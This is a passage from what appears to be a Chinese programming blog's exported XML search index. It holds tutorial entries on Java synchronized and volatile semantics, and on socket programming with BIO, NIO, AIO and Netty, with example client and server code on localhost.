拥有锁重入的功能，也就是在使用synchronized时，当一个线程得到一个对象的锁后，再次调用此对象时就是可以再次获得该对象的锁。 锁重入形式1:对于某一线程操作某一对象时，在该类函数中，不同的同步方法相互调用，形成锁重入。 锁重入形式2:对于某一线程操作某一对象时，在父子类函数中，不同类的不同的同步方法相互调用，形成锁重入。 synchronized的异常处理当synchronized处理过程中，抛出异常时会丢失锁，因此要好好的处理异常，不然业务逻辑就发生严重错误。 1.6 synchronized代码块对象锁123synchronized(this)&#123;&#125;//修改对象里的属性时，不会释放锁。 字符串(它也是对象)锁：1.使用常量字符串作为锁123456synchronized(“ssss”)&#123; while(true)&#123; //这种形式某一线程不会释放锁,此序使用"ssss"对象锁 &#125;&#125; 2.使用new String(“sss”)作为锁,每次访问该代码块，都使用新的字符串作为锁123456synchronized(new String(“sss”))&#123; while(true)&#123; //这种形式任意线程不会释放锁,此序使用各自new 出来的"ssss"对象锁,相互不影响 &#125;&#125; 3.修改对象的引用，导致释放锁12345private lockstr=’ssss’;synchronized(lockstr)&#123; lockstr=“aaa”; //这种形式，当线程在改变的瞬间释放锁，导致其他线程进来&#125; 死锁：123456789101112131415//线程1执行的代码块：synchronized(object1)&#123; //尝试获取object2锁 synchronized(object2)&#123; .. &#125;&#125;//线程2执行的代码块：synchronized(object2)&#123; //尝试获取object1锁 synchronized(object1)&#123; .. &#125;&#125; 以上是双方互持有对方的锁，形成了死锁 1.7 volatile关键字volatile 关键字主要作用是使变量在多个线程间可见 下面这段话摘自《深入理解Java虚拟机》：“观察加入volatile关键字和没有加入volatile关键字时所生成的汇编代码发现，加入volatile关键字时，会多出一个lock前缀指令” lock前缀指令实际上相当于一个内存屏障（也成内存栅栏），内存屏障会提供3个功能： 1）它确保指令重排序时不会把其后面的指令排到内存屏障之前的位置，也不会把前面的指令排到内存屏障的后面；即在执行到内存屏障这句指令时，在它前面的操作已经全部完成； 2）它会强制将对缓存的修改操作立即写入主存； 3）如果是写操作，它会导致其他CPU中对应的缓存行无效。 可见性当一个共享变量被volatile修饰时，它会保证修改的值会立即被更新到主存，当有其他线程需要读取时，它会去内存中读取新值。 而普通的共享变量不能保证可见性，因为普通共享变量被修改之后，什么时候被写入主存是不确定的，当其他线程去读取时，此时内存中可能还是原来的旧值，因此无法保证可见性。 另外，通过synchronized和Lock也能够保证可见性，synchronized和Lock能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。 使用volatile关键字的话，当线程2进行修改时，会导致线程1的工作内存中缓存变量stop的缓存行无效（反映到硬件层的话，就是CPU的L1或者L2缓存中对应的缓存行无效）；由于线程1的工作内存中缓存变量stop的缓存行无效，所以线程1再次读取变量stop的值时会去主存读取。 综上所述，volatile能保证可见性,synchronized和Lock也能保证可见性 原子性1234x = 10; //语句1y = x; //语句2x++; //语句3x = x + 1; //语句4 语句1 是直接将数值10赋值给x，也就是说线程执行这个语句的会直接将数值10写入到工作内存中。 语句2 实际上包含2个操作，它先要去读取x的值，再将x的值写入工作内存，虽然读取x的值以及 将x的值写入工作内存 这2个操作都是原子性操作，但是合起来就不是原子性操作了。 同样的，x++和 x = x+1包括3个操作：读取x的值，进行加1操作，写入新的值。 所以上面4个语句只有语句1的操作具备原子性。 volatile 能保证可见性，但不能保证原子性synchronized，Lock,java.util.concurrent.atomic*能保证原子性 有序性在前面提到volatile关键字能禁止指令重排序，所以volatile能在一定程度上保证有序性。 volatile关键字禁止指令重排序有两层意思： 当程序执行到volatile变量的读操作或者写操作时，在其前面的操作的更改肯定全部已经进行，且结果已经对后面的操作可见；在其后面的操作肯定还没有进行； 在进行指令优化时，不能将在对volatile变量访问的语句放在其后面执行，也不能把volatile变量后面的语句放到其前面执行。 可能上面说的比较绕，举个简单的例子：12345678//x、y为非volatile变量//flag为volatile变量 x = 2; //语句1y = 0; //语句2flag = true; //语句3x = 4; //语句4y = -1; //语句5 由于flag变量为volatile变量，那么在进行指令重排序的过程的时候，不会将语句3放到语句1、语句2前面，也不会讲语句3放到语句4、语句5后面。但是要注意语句1和语句2的顺序、语句4和语句5的顺序是不作任何保证的。 并且volatile关键字能保证，执行到语句3时，语句1和语句2必定是执行完毕了的，且语句1和语句2的执行结果对语句3、语句4、语句5是可见的。 一个例子： 123456789//线程1:context = loadContext(); //语句1inited = true; //语句2 //线程2:while(!inited )&#123; sleep() &#125;doSomethingwithconfig(context); 前面举这个例子的时候，提到有可能语句2会在语句1之前执行，那么久可能导致context还没被初始化，而线程2中就使用未初始化的context去进行操作，导致程序出错。 这里如果用volatile关键字对inited变量进行修饰，就不会出现这种问题了，因为当执行到语句2时，必定能保证context已经初始化完毕。 volatile应用场景ynchronized关键字是防止多个线程同时执行一段代码，那么就会很影响程序执行效率，而volatile关键字在某些情况下性能要优于synchronized，但是要注意volatile关键字是无法替代synchronized关键字的，因为volatile关键字无法保证操作的原子性。通常来说，使用volatile必须具备以下2个条件： 1）对变量的写操作不依赖于当前值 2）该变量没有包含在具有其他变量的不变式中 实际上，这些条件表明，可以被写入 volatile 变量的这些有效值独立于任何程序的状态，包括变量的当前状态。 事实上，我的理解就是上面的2个条件需要保证操作是原子性操作，才能保证使用volatile关键字的程序在并发时能够正确执行。 下面列举几个Java中使用volatile的几个场景。 状态标记量1234567891011//例1volatile boolean flag = false; //线程1while(!flag)&#123; doSomething();&#125; //线程2public void setFlag() &#123; flag = true;&#125;setFlag(); 1234567891011//例2volatile boolean inited = false;//线程1:context = loadContext(); inited = true; //线程2:while(!inited )&#123;sleep()&#125;doSomethingwithconfig(context); 就是在两个线程之间，一个线程的循环状态被两外一线程通过inited的值来控制 double check123456789101112131415161718//例3class Singleton&#123; private volatile static Singleton instance = null; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; if(instance==null) &#123; synchronized (Singleton.class) &#123; if(instance==null) instance = new Singleton(); &#125; &#125; return instance; &#125;&#125; double-check的应用就是：多线程取得单例时，先只允许同步获取单例，一旦单例被实例化出来，其他的线程就无须来竞争锁都可以异步获取单例。]]></content>
      <categories>
        <category>java</category>
        <category>concurrent</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>synchronized</tag>
        <tag>volatile</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket网络编程第三篇]]></title>
    <url>%2F2018%2F02%2F25%2Fsocket-io-3%2F</url>
    <content type="text"><![CDATA[目录代码：https://github.com/dravinbox/SocketIO_03 最佳实践（数据通信，心跳检测） netty实现文件服务器（基于Http协议） mina入门基础 1.1 最佳实践 - 数据通信考虑机器应该如何使用netty通信： 第一种，使用长连接，如果服务器的性能足够好，并且我们的客户端的数量也比较少的情况下，推荐这种 第二种，一次性批量提交数据，采用短连接；又或者定时任务轮询提交，在对于实时性不高的应用程序中可以推荐使用。 第三种，我们可以使用特殊的长连接，超时时断开连接，下次需要发送请求时，再次建立连接。 1.2最佳实践 - 心跳检测我们使用Socket 通信一般经常会处理多个服务器之间的心跳检测，一般来说我们去维护服务器集群，肯定有一台或几台服务主机（Master),然后还有N台（Slave）,那么我们的主机肯定要时时刻刻知道自己下面的从服务器的各种情况，然后进行实时监控的功能，这个在分布式架构里叫做心跳检测或心跳监控，最佳处理方案是使用一下通信框架进行实践如Netty]]></content>
      <categories>
        <category>Socket</category>
        <category>Socket-03</category>
      </categories>
      <tags>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket网络编程第二篇]]></title>
    <url>%2F2018%2F02%2F24%2Fsocket-io-2%2F</url>
    <content type="text"><![CDATA[目录代码：https://github.com/dravinbox/SocketIO_02 1.Netty初步2.HelloWorld3.Netty核心技术之（TCP拆包和粘包问题）4.Netty核心技术之（编解码技术）5.Netty的UDP实现6.Netty的WebSocket实现 1.1 为什么选择Netty我们已经了解了Socket通信/IO/NIO/AIO编程，对于通信模型已经有了一个初步的认识。其实我们之前所学习的仅仅是一个模型，如果把这些真正的用于实际工作中去，那么还需要不断的完善，扩展和优化。比如很经典的TCP读包写包问题，或者是数据接收的大小，实际的通信读取与应答的处理逻辑等等一些细节问题需要我们认真的去思考，而这些我们都需要大量的时间和经历，以及丰富的经验。所以想学好socket通信不是件容易的事情，那么现在，我们就要学习一门新的技术Netty，我们为什么选择Netty，原因无他，简单！我们再也不必要去编写复杂的代码逻辑去实现通信，我们再也不需要去考虑性能问题，不需要考虑便解码问题，半包读写问题等，这些强大的Netty已经帮我们实现好了，我们只需要使用即可。 Netty是最流行的NIO框架，他的健壮性，功能，性能，可定制性和可扩展性在同类的框架都是首屈一指。它已经得到成千上万个商业/商用项目验证，如Hadoop的RPC框架Avro,以及我们之后学的JMS框架，强大的RocketMQ消息中间件，还有主流的分布式通信框架Dubbox等等。 1.4 Netty简介Netty是基于Java NIO 的网络应用框架Netty是一个NIO Client-Server(客户端服务器)框架，使用Netty 可以是快速开发网络应用，例如服务器和客户端协议。Netty提供了一种新的方式来开发网络应用程序，这种新的方式使得它很容易使用和很强的扩展性。Netty的内部实现是很复杂的，但是netty提供了简单易用的api从网络处理代码中解耦业务逻辑。Netty是完全基于NIO实现的，所以整个Netty都是异步的。网络应用程序通常要求较高的可扩展性，无论是Netty还是其他基于Java NIO 的框架，都会提供可扩展性的解决方案。Netty中一个关键的组成部分是它的异步特性，本章将讨论同步（阻塞）和异步（非阻塞）的IO来说明为什么使用异步代码来解决扩展性问题已经如何使用异步。 1.5 Netty架构组成 1.6 Netty特性 2.1 HelloworldNetty实现通信的步骤：1.创建两个NIO的线程组，一个专门用于网络事件处理（接收客户端的连接），另一个则进行网络通信读写。2.创建一个ServerBootstrap对象，配置Netty的一系列参数，例如接受传出的缓存大小等等。3.创建一个实际处理数据的类ChannelInitializer，进行初始化的准备工作，比如设置接受传出数据的字符集，格式，已经实际处理数据启动即可。4.绑定端口，执行同步阻塞方法等待服务器启动即可。 具体的Helloworld入门请查看：http://ifeve.com/netty5-user-guide/ 服务类DiscardServer.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package zry.netty.discard;import io.netty.bootstrap.ServerBootstrap;import io.netty.channel.ChannelFuture;import io.netty.channel.ChannelInitializer;import io.netty.channel.ChannelOption;import io.netty.channel.EventLoopGroup;import io.netty.channel.nio.NioEventLoopGroup;import io.netty.channel.socket.SocketChannel;import io.netty.channel.socket.nio.NioServerSocketChannel;public class DiscardServer &#123; private int port; public DiscardServer(int port)&#123; this.port=port; &#125; public void run() throws InterruptedException&#123; EventLoopGroup bossGroup=new NioEventLoopGroup(); EventLoopGroup workGroup=new NioEventLoopGroup(); try &#123; ServerBootstrap bootstrap= new ServerBootstrap(); bootstrap.group(bossGroup,workGroup) .channel(NioServerSocketChannel.class) .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel sc) throws Exception &#123; sc.pipeline().addLast(new DiscardHandler()); &#125; &#125;) .option(ChannelOption.SO_BACKLOG, 128) .childOption(ChannelOption.SO_KEEPALIVE, true); ChannelFuture cf = bootstrap.bind(port).sync(); cf.channel().closeFuture().sync(); &#125; finally &#123; workGroup.shutdownGracefully(); bossGroup.shutdownGracefully(); &#125; &#125; public static void main(String[] args) throws Exception&#123; int port=8765; new DiscardServer(port).run(); &#125;&#125; 服务端处理类DiscardHandler.java12345678910111213141516171819202122232425package zry.netty.discard;import io.netty.channel.ChannelHandlerAdapter;import io.netty.channel.ChannelHandlerContext;import io.netty.util.ReferenceCountUtil;public class DiscardHandler extends ChannelHandlerAdapter&#123; @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123;// try &#123; ctx.write(msg); ctx.flush();// &#125; finally &#123;// ReferenceCountUtil.release(msg);// &#125; &#125; @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123; cause.printStackTrace(); ctx.close(); &#125;&#125; 客户端Client.java12345678910111213141516171819202122232425262728293031323334353637383940414243package zry.netty.discard;import io.netty.bootstrap.Bootstrap;import io.netty.buffer.Unpooled;import io.netty.channel.ChannelFuture;import io.netty.channel.ChannelInitializer;import io.netty.channel.ChannelOption;import io.netty.channel.EventLoopGroup;import io.netty.channel.nio.NioEventLoopGroup;import io.netty.channel.socket.SocketChannel;import io.netty.channel.socket.nio.NioSocketChannel;public class Client &#123; public static void main(String[] args) throws InterruptedException &#123; EventLoopGroup workGroup=new NioEventLoopGroup(); try &#123; Bootstrap bootstrap= new Bootstrap(); bootstrap.group(workGroup) .channel(NioSocketChannel.class) .handler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel sc) throws Exception &#123; sc.pipeline().addLast(new ClientHandler()); &#125; &#125;) .option(ChannelOption.SO_KEEPALIVE, true); ChannelFuture channelFuture=bootstrap.connect("127.0.0.1",8765).sync(); channelFuture.channel().write(Unpooled.copiedBuffer("hello,world".getBytes())); channelFuture.channel().flush(); channelFuture.channel().closeFuture().sync(); &#125; finally &#123; // TODO: handle finally clause workGroup.shutdownGracefully(); &#125; &#125;&#125; 客户端处理器ClientHandler.java123456789101112131415161718192021222324252627282930package zry.netty.discard;import io.netty.buffer.ByteBuf;import io.netty.channel.ChannelHandlerAdapter;import io.netty.channel.ChannelHandlerContext;import io.netty.util.ReferenceCountUtil;public class ClientHandler extends ChannelHandlerAdapter&#123; @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123; try &#123; ByteBuf b=(ByteBuf)msg; byte[] m=new byte[b.readableBytes()]; b.readBytes(m); String data_str=new String(m, "utf-8"); System.out.println("getFromServer: "+data_str); &#125; finally &#123; ReferenceCountUtil.release(msg); &#125; &#125; @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123; cause.printStackTrace(); ctx.close(); &#125;&#125; 完成了一个hello程序。 3.1 TCP粘包，拆包问题我们发的一个完整的包可能会被TCP分成多个包进行发送，也可能把多个小包封装成一个大的数据包发送出去，这就是所谓的TCP粘包，拆包问题。 分析产生的原因： 1.应用程序write写入的字节大小 大于套接字口发送缓冲区的大小 2.进行MSS大小的TCP分段 3.以太帧的payload大于MTU进行IP分片 3.2 TCP粘包，拆包问题解决方案粘包拆包问题的解决方案，根据业界主流协议，的有三中方案：1.在包尾部添加特殊的字符进行分割，例如加回车等2.消息定长，例如每个报文的大小固定为200个字节，如果不够，空位补空格。3.将消息分为消息头和消息体，在消息头中包含表示消息总长度的字段，然后进行业务逻辑的处理 3.3 Netty如何解决粘包，拆包问题1.使用自定义分隔符类 DelimiterBasedFrameDecoder2.使用定长类 FixedLengthFrameDecoder 服务类：使用了分隔符类,定义了分隔符为$ ByteBuf buf = Unpooled.copiedBuffer(“$“.getBytes());使用分隔符类new DelimiterBasedFrameDecoder(1024, buf))并使用支付串解码类new StringDecoder() Server.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package bhz.netty.ende1;import java.nio.ByteBuffer;import io.netty.bootstrap.ServerBootstrap;import io.netty.buffer.ByteBuf;import io.netty.buffer.Unpooled;import io.netty.channel.ChannelFuture;import io.netty.channel.ChannelInitializer;import io.netty.channel.ChannelOption;import io.netty.channel.EventLoopGroup;import io.netty.channel.nio.NioEventLoopGroup;import io.netty.channel.socket.SocketChannel;import io.netty.channel.socket.nio.NioServerSocketChannel;import io.netty.handler.codec.DelimiterBasedFrameDecoder;import io.netty.handler.codec.FixedLengthFrameDecoder;import io.netty.handler.codec.string.StringDecoder;import io.netty.handler.codec.string.StringEncoder;public class Server &#123; public static void main(String[] args) throws Exception&#123; //1 创建2个线程，一个是负责接收客户端的连接。一个是负责进行数据传输的 EventLoopGroup pGroup = new NioEventLoopGroup(); EventLoopGroup cGroup = new NioEventLoopGroup(); //2 创建服务器辅助类 ServerBootstrap b = new ServerBootstrap(); b.group(pGroup, cGroup) .channel(NioServerSocketChannel.class) .option(ChannelOption.SO_BACKLOG, 1024) .option(ChannelOption.SO_SNDBUF, 32*1024) .option(ChannelOption.SO_RCVBUF, 32*1024) .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel sc) throws Exception &#123; //设置特殊分隔符 ByteBuf buf = Unpooled.copiedBuffer("$_".getBytes()); sc.pipeline().addLast(new DelimiterBasedFrameDecoder(1024, buf)); //设置字符串形式的解码 sc.pipeline().addLast(new StringDecoder()); sc.pipeline().addLast(new ServerHandler()); &#125; &#125;); //4 绑定连接 ChannelFuture cf = b.bind(8765).sync(); //等待服务器监听端口关闭 cf.channel().closeFuture().sync(); pGroup.shutdownGracefully(); cGroup.shutdownGracefully(); &#125; &#125; 服务端处理器：直接转化msg为字符串，返回数据时也跟上$_结尾 ServerHandler.java123456789101112131415161718192021222324252627282930313233343536package bhz.netty.ende1;import io.netty.buffer.Unpooled;import io.netty.channel.ChannelHandlerAdapter;import io.netty.channel.ChannelHandlerContext;public class ServerHandler extends ChannelHandlerAdapter &#123; @Override public void channelActive(ChannelHandlerContext ctx) throws Exception &#123; System.out.println(" server channel active... "); &#125; @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123; String request = (String)msg; System.out.println("Server :" + msg); String response = "服务器响应：" + msg + "$_"; ctx.writeAndFlush(Unpooled.copiedBuffer(response.getBytes())); &#125; @Override public void channelReadComplete(ChannelHandlerContext ctx) throws Exception &#123; &#125; @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable t) throws Exception &#123; ctx.close(); &#125;&#125; 客户端：同样使用分隔符 Client.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package bhz.netty.ende1;import io.netty.bootstrap.Bootstrap;import io.netty.buffer.ByteBuf;import io.netty.buffer.Unpooled;import io.netty.channel.ChannelFuture;import io.netty.channel.ChannelInitializer;import io.netty.channel.EventLoopGroup;import io.netty.channel.nio.NioEventLoopGroup;import io.netty.channel.socket.SocketChannel;import io.netty.channel.socket.nio.NioSocketChannel;import io.netty.handler.codec.DelimiterBasedFrameDecoder;import io.netty.handler.codec.FixedLengthFrameDecoder;import io.netty.handler.codec.string.StringDecoder;import io.netty.handler.codec.string.StringEncoder;public class Client &#123; public static void main(String[] args) throws Exception &#123; EventLoopGroup group = new NioEventLoopGroup(); Bootstrap b = new Bootstrap(); b.group(group) .channel(NioSocketChannel.class) .handler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel sc) throws Exception &#123; // ByteBuf buf = Unpooled.copiedBuffer("$_".getBytes()); sc.pipeline().addLast(new DelimiterBasedFrameDecoder(1024, buf)); sc.pipeline().addLast(new StringDecoder()); sc.pipeline().addLast(new ClientHandler()); &#125; &#125;); ChannelFuture cf = b.connect("127.0.0.1", 8765).sync(); cf.channel().writeAndFlush(Unpooled.wrappedBuffer("bbbb$_".getBytes())); cf.channel().writeAndFlush(Unpooled.wrappedBuffer("cccc$_".getBytes())); //等待客户端端口关闭 cf.channel().closeFuture().sync(); group.shutdownGracefully(); &#125;&#125; ClientHandler.java123456789101112131415161718192021222324252627282930313233package bhz.netty.ende1;import io.netty.channel.ChannelHandlerAdapter;import io.netty.channel.ChannelHandlerContext;import io.netty.util.ReferenceCountUtil;public class ClientHandler extends ChannelHandlerAdapter&#123; @Override public void channelActive(ChannelHandlerContext ctx) throws Exception &#123; System.out.println("client channel active... "); &#125; @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123; try &#123; String response = (String)msg; System.out.println("Client: " + response); &#125; finally &#123; ReferenceCountUtil.release(msg); &#125; &#125; @Override public void channelReadComplete(ChannelHandlerContext ctx) throws Exception &#123; &#125; @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123; ctx.close(); &#125;&#125; 4.1 Netty 编解码技术编解码技术，说白了就是java序列化技术，序列化的目的：1.进行网络传输 2.对象持久化 虽然我们可以使用java进行对象序列化，netty去传输，但是java序列化的硬伤太多，比如java序列化无法跨语言，序列化后码流太大，序列化性能太低等等。 主流的编解码框架： JBoss的Marshalling包 Google的Protobuf 基于Protobuf的Kyro MessagePack框架 4.2 JBoss Marshalling 序列化框架JBoss Marshalling是一个java对象序列化包，对JDK默认的序列化框架进行了优化，但保持跟java.io.Serializable接口的兼容，同是增加了一些可调的参数和附加特性。JBoss Marshalling与Netty结合后进行序列化对象的代码编写非常简单。]]></content>
      <categories>
        <category>Socket</category>
        <category>Socket-02</category>
      </categories>
      <tags>
        <tag>Socket</tag>
        <tag>Netty</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket网络编程第一篇]]></title>
    <url>%2F2018%2F02%2F24%2Fsocket-io%2F</url>
    <content type="text"><![CDATA[目录代码：https://github.com/dravinbox/SocketIO_01 1.学习基本概念，传统的同步阻塞式I/O编程,伪异步IO实现2.学习基于NIO的同步非阻塞式编程3.了解NIO2.0(jdk1.7以后)的异步非阻塞式(AIO)编程 1.1 基本概念Socket 又称套接字，应用程序通常通过“套接字”向网络发出请求或应答网络请求。套接字之间的连接过程可以分为四个步骤：（1）服务器监听：等待连接的状态，实时监控网络状态（2）客户端请求服务器：客户端的套接字提出连接请求，要连接的目标是服务器的套接字，为此，客户端的套接字必须首先描述他要连接的服务器的套接字，指出服务器套接字的地址和端口号，然后向服务器套接字提出连续的请求。（3）服务器确认：当服务器套接字监听到或者说接受到客户端套接字的连接请求，他就会响应客户端套接字的请求，建立一个新的线程，把服务器套接字的描述发给客户端。（4）客户端确认：一点客户端确认该描述，连接就建立好了，双方开始进行通信，而服务器套接字继续处于监听的状态，继续接受其他客户端套接字的连接请求。进行通信 1.2 概念IO(BIO)和NIO的区别：其本质就是阻塞和非阻塞的区别 阻塞概念：应用程序再获取网络数据的时候，如果网络传输的数据很慢，那么程序就一直等待，直到传输完毕为止。 非阻塞概念：应用程序直接可以获取已经准备就绪好的数据，无需等待BIO为同步阻塞形式，NIO为同步非阻塞形式，NIO并没有实现异步，再JDK1.7之后，升级了NIO库包，支持异步非阻塞通信模型即NIO2.0（AIO） 同步和异步：同步和异步一般是面向操作系统与应用程序对IO操作的层面上来区别的。 同步：应用程序会直接参与IO读写操作，并且我们的应用程序会直接阻塞到某一个方法上，直到数据准备就绪；或者采用轮询的策略实时检查数据的就绪状态，如果就绪则获取数据。 异步：所有的IO读写操作交给操作系统处理，与我们的应用程序没有直接关系，我们程序不需要关心IO读写，当操作系统完成了IO读写操作时，会给我们应用程序发送通知，我们的应用程序直接拿走数据即可。 同步是说你的server服务端的执行方式阻塞是说具体的技术，接受数据的方式，状态（IO,NIO) 1.3 传统的BIO编程（com.bjsxt.bio）网络编程的基本模型是Client/Server模型，也就是两个进程直接进行相互通信，其中服务端提供配置信息（绑定的ip地址和监听端口），客户端通过连接操作向服务端监听地址发起连接请求，通过3次的握手建立连接，如果连接成功，则双方既可以进行通信 1.4 伪异步IO采用线程池和任务队列可以实现一种伪异步的IO通信框架。就是将客户端的socket封装城一个task任务（实现runnable接口的类）然后投递到线程池中，配置相应的队列进行实现。 2.1 NIO编程介绍学习NIO编程，首先了解几个概念：Buffer（缓冲区），Channel(管道，通道)，Selector（选择器，多路复用器） 服务器运行的是ServerSocketChannel，客户端运行的是SocketChannel，可以理解为是对Socket的封装，数据呢就存在Buffer缓冲区里，而不是直接的InputStream和OutputStream的直接方式。 客户端的通道需要注册在服务端里的Selector里，Selector就会轮询所有注册的通道，根据通道的状态，来执行相关的操作。这里有4种通道状态，连接状态Connect，阻塞状态Accept，可读状态Read，可写状态Write。 2.2 BufferBuffer 是一个对象，它包含一些要写入或者读取的数据，在NIO类库中加入Buffer对象，体现新库与原IO的一个重要的区别。在面向流的IO中，可以将数据直接写入或者读取到Stream对象中，在NIO库中，所有数据都是用缓冲区处理的（读写）。缓冲区实质是一个数组，通常它是一个字节数组（ByteBuffer），也可以使用其他类型的数组。这个数组为缓冲区提供了数据的访问读写等操作属性，如位置，容量，上限等概念。参考api文档。Buffer类型：我们最常用的就是ByteBuffer，实际上每一种java基本类型都对应了一种缓存区（除了Boolean类型）ByteBufferCharBufferShorBufferIntBufferLongBufferFloatBufferDoubleBuffer 2.3 Channel通道（Channel），他就像自来水管道一样，网络数据通过Channel读取和写入，通道与流不同之处在于管道是双向的，而流只是一个方向上的移动（一个流必须是InputSteam或者OutputStream的子类），而管道可以用于读/写或者二者同时进行，最关键的是可以与多路复用器结合起来，有多种的状态位，方便多路复用器去识别。事实上通道分为两大类，一类是网络读写的（SelectableChannel),一类是用于文件操作(FileChannel),我们使用的是SocketChannel和ServerSockerChannel都是SelectableChannel的子类。 2.4 Selector(一)多路复用器（selector），他是NIO编程的基础，非常重要，多路复用器提供选择已经就绪的任务的能力。简单来说，就是Selector会不断地轮询注册在其上的通道（Channel），如果某个通道发生了读写操作，这个通道就处于就绪状态，会被Selector轮询出来，然后通过SelectionKey可以取得就绪的Channel集合，从而进行后续的IO操作。一个多路复用器可以复杂成千上万Channel通道，没有上限，这也是JDK使用epoll替代传统的select实现，获得连接句柄没有限制，这也就意味着我们只要一个线程Selector的轮询，就可以接入成千上万个客户端，这个是JDK NIO的巨大进步。 2.5 Selector(二)Selector线程类似一个管理者（Master），管理成千上万的个管道，然后轮询哪一个管道的数据已经准备好，通知Cpu值执行IO的读取获取写入操作。 每个管道都会对选择器进行注册不用的时间状态，以便选择器查找。SelectionKey.OP_CONNECTSelectionKey.OP_ACCEPTSelectionKey.OP_READSelectionKey.OP_WRITE 3.1 AIOAIO编程，在NIO基础之上引入了异步通道的该你那，并提供了异步文件和异步套接字通道的实现，从而在真正意义上实现了异步非阻塞，之前我们学习的NIO只是非阻塞而并非异步。而AIO它不需要通过多路复用器对注册的通道进行轮询操作即可实现异步读写。从而简化了NIO编程模型。也可以称之为NIO2.0，这种模型才可以真正的属于我们异步非阻塞的模型.AsynchronousServerSocketChannelAsynchronousSocketChannel AIO隐藏了对Channel的操作，只需定义一个线程缓存池，重写好handler的接口函数即可。每一个客户端连接都会递归调用服务器的accept方法，保证一个客户端可以连接上来。 Server.java12345678910111213141516171819202122232425262728293031323334353637383940414243package bhz.aio;import java.net.InetSocketAddress;import java.nio.channels.AsynchronousChannelGroup;import java.nio.channels.AsynchronousServerSocketChannel;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class Server &#123; //线程池 private ExecutorService executorService; //线程组 private AsynchronousChannelGroup threadGroup; //服务器通道 public AsynchronousServerSocketChannel assc; public Server(int port)&#123; try &#123; //创建一个缓存池 executorService = Executors.newCachedThreadPool(); //创建线程组 threadGroup = AsynchronousChannelGroup.withCachedThreadPool(executorService, 1); //创建服务器通道 assc = AsynchronousServerSocketChannel.open(threadGroup); //进行绑定 assc.bind(new InetSocketAddress(port)); System.out.println("server start , port : " + port); //进行阻塞 assc.accept(this, new ServerCompletionHandler()); //一直阻塞 不让服务器停止 Thread.sleep(Integer.MAX_VALUE); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; Server server = new Server(8765); &#125; &#125; ServerCompletionHandler.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package bhz.aio;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousSocketChannel;import java.nio.channels.CompletionHandler;import java.util.concurrent.ExecutionException;public class ServerCompletionHandler implements CompletionHandler&lt;AsynchronousSocketChannel, Server&gt; &#123; @Override public void completed(AsynchronousSocketChannel asc, Server attachment) &#123; //当有下一个客户端接入的时候 直接调用Server的accept方法，这样反复执行下去，保证多个客户端都可以阻塞 attachment.assc.accept(attachment, this); read(asc); &#125; private void read(final AsynchronousSocketChannel asc) &#123; //读取数据 ByteBuffer buf = ByteBuffer.allocate(1024); asc.read(buf, buf, new CompletionHandler&lt;Integer, ByteBuffer&gt;() &#123; @Override public void completed(Integer resultSize, ByteBuffer attachment) &#123; //进行读取之后,重置标识位 attachment.flip(); //获得读取的字节数 System.out.println("Server -&gt; " + "收到客户端的数据长度为:" + resultSize); //获取读取的数据 String resultData = new String(attachment.array()).trim(); System.out.println("Server -&gt; " + "收到客户端的数据信息为:" + resultData); String response = "服务器响应, 收到了客户端发来的数据: " + resultData; write(asc, response); &#125; @Override public void failed(Throwable exc, ByteBuffer attachment) &#123; exc.printStackTrace(); &#125; &#125;); &#125; private void write(AsynchronousSocketChannel asc, String response) &#123; try &#123; ByteBuffer buf = ByteBuffer.allocate(1024); buf.put(response.getBytes()); buf.flip(); asc.write(buf).get(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void failed(Throwable exc, Server attachment) &#123; exc.printStackTrace(); &#125;&#125; Client.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package bhz.aio;import java.io.UnsupportedEncodingException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousSocketChannel;import java.util.concurrent.ExecutionException;public class Client implements Runnable&#123; private AsynchronousSocketChannel asc ; public Client() throws Exception &#123; asc = AsynchronousSocketChannel.open(); &#125; public void connect()&#123; asc.connect(new InetSocketAddress("127.0.0.1", 8765)); &#125; public void write(String request)&#123; try &#123; asc.write(ByteBuffer.wrap(request.getBytes())).get(); read(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private void read() &#123; ByteBuffer buf = ByteBuffer.allocate(1024); try &#123; asc.read(buf).get(); buf.flip(); byte[] respByte = new byte[buf.remaining()]; buf.get(respByte); System.out.println(new String(respByte,"utf-8").trim()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; catch (UnsupportedEncodingException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void run() &#123; while(true)&#123; &#125; &#125; public static void main(String[] args) throws Exception &#123; Client c1 = new Client(); 